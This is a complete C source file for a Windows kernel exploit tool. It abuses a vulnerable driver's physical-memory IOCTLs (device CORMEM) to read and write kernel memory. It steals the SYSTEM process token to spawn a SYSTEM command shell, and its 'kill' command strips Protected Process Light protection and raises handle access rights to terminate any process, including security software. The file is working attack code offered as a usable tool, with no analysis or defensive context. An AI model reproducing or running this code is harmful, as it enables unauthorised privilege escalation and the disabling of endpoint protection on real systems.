#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

#define IOCTL_MAP 0x22200Cu
#define IOCTL_UNMAP 0x222010u
#define IOCTL_V2P 0x22201Cu
#define SystemModuleInformation 11
#define ENTRIES_PER_PAGE 256

typedef struct {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} MODULE_INFO;

typedef struct {
	ULONG Count;
	MODULE_INFO Modules[1];
} MODULE_LIST;

typedef NTSTATUS(WINAPI* fnNtQSI)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* fnRtlGetVersion)(PRTL_OSVERSIONINFOW);

struct Offsets {
	DWORD Pid;
	DWORD Links;
	DWORD Token;
	DWORD Name;
	DWORD SigLevel;
	DWORD SecSigLevel;
	DWORD Protection;
	DWORD ObjTable;
};

static Offsets g_off;
static HANDLE g_dev = INVALID_HANDLE_VALUE;

static PVOID MapPhys(ULONGLONG physAddr, ULONGLONG length)
{
	struct {
		ULONGLONG addr;
		ULONGLONG len;
		ULONGLONG reserved;
	} input = { physAddr, length, 0 };

	ULONGLONG output = 0;
	DWORD returned = 0;

	if (!DeviceIoControl(g_dev, IOCTL_MAP, &input, sizeof(input), &output, sizeof(output), &returned, NULL))
		return NULL;

	return (PVOID)output;
}

static void UnmapPhys(PVOID virtAddr)
{
	ULONGLONG addr = (ULONGLONG)virtAddr;
	DWORD returned = 0;

	DeviceIoControl(g_dev, IOCTL_UNMAP, &addr, sizeof(addr), NULL, 0, &returned, NULL);
}

static ULONGLONG VirtToPhys(ULONGLONG virtAddr)
{
	ULONGLONG buffer = virtAddr;
	DWORD returned = 0;

	if (!DeviceIoControl(g_dev, IOCTL_V2P, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &returned, NULL))
		return 0;

	return buffer;
}

static BOOL KRead(ULONGLONG kva, void* buf, DWORD size)
{
	ULONGLONG physAddr = VirtToPhys(kva);

	if (!physAddr)
		return FALSE;

	ULONGLONG pageOffset = physAddr & 0xFFF;
	ULONGLONG pageBase = physAddr - pageOffset;
	ULONGLONG mapSize = (pageOffset + size + 0xFFF) & ~0xFFFULL;

	PVOID mapped = MapPhys(pageBase, mapSize);

	if (!mapped)
		return FALSE;

	memcpy(buf, (BYTE*)mapped + pageOffset, size);
	UnmapPhys(mapped);

	return TRUE;
}

static BOOL KWrite(ULONGLONG kva, void* buf, DWORD size)
{
	ULONGLONG physAddr = VirtToPhys(kva);

	if (!physAddr)
		return FALSE;

	ULONGLONG pageOffset = physAddr & 0xFFF;
	ULONGLONG pageBase = physAddr - pageOffset;
	ULONGLONG mapSize = (pageOffset + size + 0xFFF) & ~0xFFFULL;

	PVOID mapped = MapPhys(pageBase, mapSize);

	if (!mapped)
		return FALSE;

	memcpy((BYTE*)mapped + pageOffset, buf, size);
	UnmapPhys(mapped);

	return TRUE;
}

static ULONGLONG KReadPtr(ULONGLONG kva)
{
	ULONGLONG value = 0;

	KRead(kva, &value, 8);

	return value;
}

static BYTE KReadByte(ULONGLONG kva)
{
	BYTE value = 0;

	KRead(kva, &value, 1);

	return value;
}

static void KWriteByte(ULONGLONG kva, BYTE value)
{
	KWrite(kva, &value, 1);
}

static DWORD GetBuild()
{
	RTL_OSVERSIONINFOW info = { sizeof(info) };

	auto func = (fnRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (func)
		func(&info);

	return info.dwBuildNumber;
}

static Offsets ResolveOffsets(DWORD build)
{
	Offsets off = {};

	if (build >= 26100) {
		off.Pid = 0x1D0;
		off.Links = 0x1D8;
		off.Token = 0x248;
		off.Name = 0x338;
		off.SigLevel = 0x5F8;
		off.SecSigLevel = 0x5F9;
		off.Protection = 0x5FA;
		off.ObjTable = 0x300;
	}
	else if (build >= 19041) {
		off.Pid = 0x440;
		off.Links = 0x448;
		off.Token = 0x4B8;
		off.Name = 0x5A8;
		off.SigLevel = 0x878;
		off.SecSigLevel = 0x879;
		off.Protection = 0x87A;
		off.ObjTable = 0x570;
	}
	else if (build >= 17763) {
		off.Pid = 0x2E0;
		off.Links = 0x2E8;
		off.Token = 0x358;
		off.Name = 0x450;
		off.SigLevel = 0x6C8;
		off.SecSigLevel = 0x6C9;
		off.Protection = 0x6CA;
		off.ObjTable = 0x418;
	}
	else {
		return ResolveOffsets(19041);
	}

	return off;
}

static ULONGLONG GetNtoskrnlBaseQSI()
{
	auto NtQSI = (fnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

	ULONG length = 0;

	NtQSI(SystemModuleInformation, NULL, 0, &length);

	if (!length)
		return 0;

	auto* modules = (MODULE_LIST*)malloc(length);

	if (!modules)
		return 0;

	if (NtQSI(SystemModuleInformation, modules, length, &length)) {
		free(modules);
		return 0;
	}

	ULONGLONG base = (ULONGLONG)modules->Modules[0].ImageBase;

	free(modules);

	return base;
}

static ULONGLONG GetNtoskrnlBaseIDT()
{
#pragma pack(push, 1)
	struct {
		USHORT limit;
		ULONGLONG base;
	} idtr = {};
#pragma pack(pop)

	__asm__ __volatile__("sidt %0" : "=m"(idtr));

	if (!idtr.base)
		return 0;

	struct {
		USHORT offsetLow;
		USHORT selector;
		BYTE ist;
		BYTE typeAttr;
		USHORT offsetMid;
		ULONG offsetHigh;
		ULONG reserved;
	} idtEntry = {};

	ULONGLONG entryAddr = idtr.base + 0x0E * 16;

	if (!KRead(entryAddr, &idtEntry, sizeof(idtEntry)))
		return 0;

	ULONGLONG handler = ((ULONGLONG)idtEntry.offsetHigh << 32) | ((ULONGLONG)idtEntry.offsetMid << 16) | (ULONGLONG)idtEntry.offsetLow;

	if (!handler)
		return 0;

	ULONGLONG page = handler & ~0xFFFULL;

	for (int scan = 0; scan < 0x800; scan++) {
		USHORT magic = 0;

		if (KRead(page, &magic, 2) && magic == 0x5A4D)
			return page;

		page -= 0x1000;
	}

	return 0;
}

static ULONGLONG GetNtoskrnlBaseVAScan()
{
	const ULONGLONG VA_START = 0xFFFFF80000000000ULL;
	const ULONGLONG VA_END = 0xFFFFF80800000000ULL;
	const ULONGLONG STEP = 0x200000;

	for (ULONGLONG va = VA_START; va < VA_END; va += STEP) {
		if (!VirtToPhys(va))
			continue;

		USHORT magic = 0;

		if (!KRead(va, &magic, 2) || magic != 0x5A4D)
			continue;

		BYTE hdr[0x200] = {};

		if (!KRead(va, hdr, sizeof(hdr)))
			continue;

		LONG peOffset = *(LONG*)(hdr + 0x3C);

		if (peOffset < 0 || peOffset + 0x78 >(LONG)sizeof(hdr))
			continue;

		if (*(DWORD*)(hdr + peOffset) != 0x00004550)
			continue;

		BYTE* optHdr = hdr + peOffset + 24;

		if (*(USHORT*)optHdr != 0x20B)
			continue;

		DWORD sizeOfImage = *(DWORD*)(optHdr + 56);
		USHORT subsystem = *(USHORT*)(optHdr + 68);

		if (subsystem == 1 && sizeOfImage > 0x500000)
			return va;
	}

	return 0;
}

static ULONGLONG GetNtoskrnlBase()
{
	ULONGLONG base = GetNtoskrnlBaseQSI();

	if (!base)
		base = GetNtoskrnlBaseIDT();

	if (!base)
		base = GetNtoskrnlBaseVAScan();

	return base;
}

static ULONGLONG FindKernelExport(ULONGLONG kernelBase, const char* name)
{
	HMODULE local = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);

	if (!local)
		return 0;

	auto localAddr = (ULONGLONG)GetProcAddress(local, name);

	ULONGLONG offset = localAddr ? localAddr - (ULONGLONG)local : 0;

	FreeLibrary(local);

	return offset ? kernelBase + offset : 0;
}

static DWORD PidByName(const char* procName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32 entry = { sizeof(entry) };

	DWORD pid = 0;

	for (BOOL ok = Process32First(snapshot, &entry); ok;
		ok = Process32Next(snapshot, &entry)) {
		if (!_stricmp(entry.szExeFile, procName)) {
			pid = entry.th32ProcessID;
			break;
		}
	}

	CloseHandle(snapshot);
	return pid;
}

static ULONGLONG GetSystemEprocess()
{
	ULONGLONG kernelBase = GetNtoskrnlBase();

	if (!kernelBase)
		return 0;

	ULONGLONG pPsInitial = FindKernelExport(kernelBase, "PsInitialSystemProcess");

	if (!pPsInitial)
		return 0;

	ULONGLONG eprocess = KReadPtr(pPsInitial);

	if (!eprocess || (DWORD)KReadPtr(eprocess + g_off.Pid) != 4)
		return 0;

	return eprocess;
}

static ULONGLONG FindEprocess(ULONGLONG systemEproc, DWORD targetPid)
{
	ULONGLONG current = systemEproc;

	for (int iter = 0; iter < 4096; iter++) {
		if ((DWORD)KReadPtr(current + g_off.Pid) == targetPid)
			return current;

		ULONGLONG flink = KReadPtr(current + g_off.Links);
		ULONGLONG next = flink - g_off.Links;

		if (!flink || next == systemEproc)
			break;

		current = next;
	}

	return 0;
}

static ULONGLONG LookupHandleEntry(ULONGLONG eprocess, HANDLE handle)
{
	ULONGLONG objTable = KReadPtr(eprocess + g_off.ObjTable);

	if (!objTable)
		return 0;

	ULONGLONG tableCode = KReadPtr(objTable + 0x08);
	ULONG level = (ULONG)(tableCode & 3);
	ULONGLONG tableBase = tableCode & ~7ULL;
	ULONG index = ((ULONG)(ULONG_PTR)handle) >> 2;

	if (level == 0)
		return tableBase + (ULONGLONG)index * 16;

	if (level == 1) {
		ULONG pageIndex = index / ENTRIES_PER_PAGE;
		ULONG entryIndex = index % ENTRIES_PER_PAGE;
		ULONGLONG subTable = KReadPtr(tableBase + (ULONGLONG)pageIndex * 8);

		return subTable ? subTable + (ULONGLONG)entryIndex * 16 : 0;
	}

	if (level == 2) {
		ULONG topIndex = index / (ENTRIES_PER_PAGE * ENTRIES_PER_PAGE);
		ULONG midIndex = (index / ENTRIES_PER_PAGE) % ENTRIES_PER_PAGE;
		ULONG entryIndex = index % ENTRIES_PER_PAGE;

		ULONGLONG midTable = KReadPtr(tableBase + (ULONGLONG)topIndex * 8);

		if (!midTable)
			return 0;

		ULONGLONG subTable = KReadPtr(midTable + (ULONGLONG)midIndex * 8);

		return subTable ? subTable + (ULONGLONG)entryIndex * 16 : 0;
	}

	return 0;
}

static BOOL GrantHandleAccess(ULONGLONG eprocess, HANDLE handle, DWORD rights)
{
	ULONGLONG entry = LookupHandleEntry(eprocess, handle);

	if (!entry)
		return FALSE;

	DWORD accessBits = 0;

	KRead(entry + 8, &accessBits, 4);

	accessBits |= rights;

	KWrite(entry + 8, &accessBits, 4);

	return TRUE;
}

static BOOL EnableDebugPriv()
{
	HANDLE token;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		return FALSE;

	LUID luid;

	LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);

	TOKEN_PRIVILEGES privs = {};

	privs.PrivilegeCount = 1;
	privs.Privileges[0].Luid = luid;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL ok = AdjustTokenPrivileges(token, FALSE, &privs, sizeof(privs), NULL, NULL);

	ok = ok && GetLastError() == ERROR_SUCCESS;

	CloseHandle(token);

	return ok;
}

static BOOL StealSystemToken(ULONGLONG systemEproc)
{
	ULONGLONG myEproc = FindEprocess(systemEproc, GetCurrentProcessId());

	if (!myEproc)
		return FALSE;

	ULONGLONG systemToken = KReadPtr(systemEproc + g_off.Token);

	if (!KWrite(myEproc + g_off.Token, &systemToken, 8))
		return FALSE;

	EnableDebugPriv();

	return TRUE;
}

static int CmdElevate(ULONGLONG systemEproc)
{
	if (!StealSystemToken(systemEproc))
		return 1;

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = {};

	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("SYSTEM cmd.exe PID %lu\n", pi.dwProcessId);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		printf("CreateProcess failed: %lu\n", GetLastError());
	}

	return 0;
}

static int CmdKill(ULONGLONG systemEproc, DWORD targetPid)
{
	if (!StealSystemToken(systemEproc))
		return 1;

	ULONGLONG myEproc = FindEprocess(systemEproc, GetCurrentProcessId());
	ULONGLONG tgtEproc = FindEprocess(systemEproc, targetPid);

	if (!tgtEproc) {
		printf("Target EPROCESS not found\n");
		return 1;
	}

	char imageName[16] = {};

	KRead(tgtEproc + g_off.Name, imageName, 15);

	KWriteByte(tgtEproc + g_off.SigLevel, 0);
	KWriteByte(tgtEproc + g_off.SecSigLevel, 0);
	KWriteByte(tgtEproc + g_off.Protection, 0);

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);

	if (!hProcess) {
		printf("OpenProcess failed: %lu\n", GetLastError());
		return 1;
	}

	if (!GrantHandleAccess(myEproc, hProcess, PROCESS_TERMINATE)) {
		CloseHandle(hProcess);
		return 1;
	}

	if (!TerminateProcess(hProcess, 1)) {
		printf("TerminateProcess failed: %lu\n", GetLastError());
		CloseHandle(hProcess);
		return 1;
	}

	CloseHandle(hProcess);
	printf("Process %lu (%s) terminated\n", targetPid, imageName);
	return 0;
}

static void Usage(const char* exe)
{
	printf("  %s elevate           Elevate to NT AUTHORITY\\SYSTEM\n", exe);
	printf("  %s kill <pid|name>   Strip PPL & terminate any process\n", exe);
}

int main(int argc, char** argv)
{
	if (argc < 2) {
		Usage(argv[0]);
		return 1;
	}

	g_dev = CreateFileA("\\\\.\\CORMEM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (g_dev == INVALID_HANDLE_VALUE) {
		printf("Cannot open \\\\.\\CORMEM (%lu)\n", GetLastError());
		return 1;
	}

	DWORD build = GetBuild();

	g_off = ResolveOffsets(build);

	ULONGLONG systemEproc = GetSystemEprocess();

	if (!systemEproc) {
		CloseHandle(g_dev);
		return 1;
	}

	int result = 1;

	if (!_stricmp(argv[1], "elevate")) {
		result = CmdElevate(systemEproc);
	}
	else if (!_stricmp(argv[1], "kill") && argc >= 3) {
		DWORD pid = (DWORD)atoi(argv[2]);

		if (!pid)
			pid = PidByName(argv[2]);

		if (!pid)
			printf("Process \"%s\" not found\n", argv[2]);
		else
			result = CmdKill(systemEproc, pid);
	}
	else {
		Usage(argv[0]);
	}

	CloseHandle(g_dev);

	return result;
}
